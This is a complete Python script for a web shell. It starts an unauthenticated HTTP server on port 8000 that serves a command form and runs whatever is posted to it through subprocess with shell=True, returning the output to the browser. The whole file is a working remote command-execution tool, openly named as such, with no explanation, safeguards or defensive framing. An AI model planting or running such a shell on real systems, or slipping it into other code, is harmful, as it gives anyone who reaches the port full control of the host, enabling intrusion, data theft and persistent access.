from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess

class WebShellHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
            <html>
            <head><title>Python Web Shell</title></head>
            <body>
            <h1>Python Web Shell</h1>
            <form method="post" action="/">
                <label for="command">Enter command:</label><br>
                <input type="text" id="command" name="command"><br>
                <input type="submit" value="Execute">
            </form>
            </body>
            </html>
        ''')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        command = post_data.split("=")[1].replace("+", " ")
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(result)
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(("Error: " + str(e)).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=WebShellHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print('Starting Python Web Shell...')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('Stopping Python Web Shell...')
        httpd.server_close()

if __name__ == '__main__':
    run()
